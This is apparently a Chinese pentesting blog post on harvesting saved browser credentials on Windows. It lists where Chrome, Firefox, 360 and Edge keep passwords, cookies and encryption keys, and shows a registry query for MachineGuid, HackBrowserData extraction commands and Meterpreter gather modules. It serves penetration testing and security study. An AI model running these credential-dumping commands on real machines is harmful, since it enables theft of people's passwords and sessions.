# 内网渗透-Windows凭据收集之浏览器凭据(7)

  
  
&lt;!--more--&gt;  
## chrome  
`chrome`配置文件路径  
`C:\Users\win10\AppData\Local\Google\Chrome\User Data/`  
`cookie`默认保存地址  
`C:\Users\win10\AppData\Local\Google\Chrome\User Data\Default\Cookies`  
`History`默认保存地址  
`C:\Users\win10\AppData\Local\Google\Chrome\User Data\Default\History`  
chrome的登录账号密码文件Login Data默认保存地址  
`C:\Users\win10\AppData\Local\Google\Chrome\User Data\Default\Login Data`  
chrome中存储加密Key的默认保存地址  
`C:\Users\win10\AppData\Local\Google\Chrome\User Data\Local State`  
查看版本及详细信息  
`chrome://version/`  
chromium  
```  
C:\Users\win10\AppData\Local\Chromium\User Data\  
C:\Users\win10\AppData\Local\Chromium\User Data\Local State  
```  
https://github.com/AlisterAmo/ChromePassDumper  
## Firefox  
`firefox`配置文件路径  
```  
C:\Users\win10\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release*\  
C:\Users\win10\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-beta*\  
C:\Users\win10\AppData\Roaming\Mozilla\Firefox\Profiles\*.dev-edition-default*\  
C:\Users\win10\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-nightly*\  
C:\Users\win10\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-esr*\  
```  
不同版本Firefox保存记录的文件名称不同，如下所示  
```  
Version大于等于32.0，保存记录的文件为logins.json  
Version大于等于3.5，小于32.0，保存记录的文件为signons.sqlite  
#凭据存储地址  
AppData\Roaming\Mozilla\Firefox\Profiles\随机字符.default-release\logins.json  
#密钥地址  
AppData\Roaming\Mozilla\Firefox\Profiles\随机字符.default-release\key4.db  
```  
注意：Master Passoword这个设置  
https://github.com/mishmashclone/Flangvik-SharpCollection/commit/46aa6d803e256fe56927e42f6da9e1f0a496e2f7  
ThunderFox.exe creds  
## 360   
360浏览器是基于Chromium 86内核开发的。  
360浏览器密码默认存储路径  
```  
360chrome C:\Users\win10\AppData\Local\360Chrome\Chrome\User Data\Default  
360浏览器 C:\Users\win10\AppData\Roaming\360se6\User Data\Default  
```  
360安全浏览器离线解密  
首先切到指定用户权限下，获取机器id，把assis2.db账密数据库文件拖回本地执行解密  
`reg query &#34;HKLM\SOFTWARE\MICROSOFT\CRYPTOGRAPHY&#34;/v&#34;MachineGuid&#34;`  
https://github.com/hayasec/360SafeBrowsergetpass  
## Edge  
```  
C:\Users\win10\AppData/Local/Microsoft/Edge/User Data/  
C:\Users\win10\AppData/Local/Microsoft/Edge/User Data/Local State  
```  
## 工具  
https://github.com/moonD4rk/HackBrowserData  
```  
#指定edge浏览器进行脱取其数据  
HackBrowserData.exe -b edge -p &#39;C:\Users\User\AppData\Local\Microsoft\Edge\User Data\Default&#39;  
  
#指定edge的key浏览器进行脱取其数据  
HackBrowserData.exe -b edge -p &#39;C:\Users\User\AppData\Local\Microsoft\Edge\User Data\Default&#39; -k &#39;C:\Users\User\AppData\Local\Microsoft\Edge\User Data\Local State&#39;  
# 指定chrome浏览器进行脱取其数据  
HackBrowserData.exe -b chrome -p &#39;C:\Users\win10\AppData\Local\Google\Chrome\User Data\Default\Login Data&#39;  
#指定chrome的key浏览器进行脱取其数据  
HackBrowserData.exe -b chrome -p &#39;C:\Users\User\AppData\Local\Microsoft\Edge\User Data\Default&#39; -k &#39;C:\Users\win10\AppData\Local\Google\Chrome\User Data\Local State&#39;  
  
全局选项  
		--verbose --vv 详细(默认值:false)  
		--compress --cc 将结果压缩为zip(默认值:false)  
		--browser value,-b value 可用浏览器 all|opera|firefox|chrome|edge(默认值为:all)  
		--result-dir 值,--dir 值导出目录(默认值：&#34;结果&#34;)  
		--format 值，-f 值格式,csv|json|控制台  
		--profile-dir-path 值,-p 值自定义配置文件目录路径，使用chrome://version获取  
		--key-file-path 值,-k 值自定义密钥文件路径  
```  
https://github.com/QAX-A-Team/BrowserGhost  
## Meterpreter对于IE、Chrome、Firefox的不同收集模块  
```  
run post/windows/gather/enum_chrome #获取Chrome缓存  
run post/windows/gather/enum_firefox #获取Firefox缓存  
run post/windows/gather/enum_ie #获取IE缓存  
```  

---

> Author: N1Rvana  
> URL: http://localhost:1313/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E5%87%AD%E6%8D%AE%E6%94%B6%E9%9B%86%E4%B9%8B%E6%B5%8F%E8%A7%88%E5%99%A8%E5%87%AD%E6%8D%AE7/  

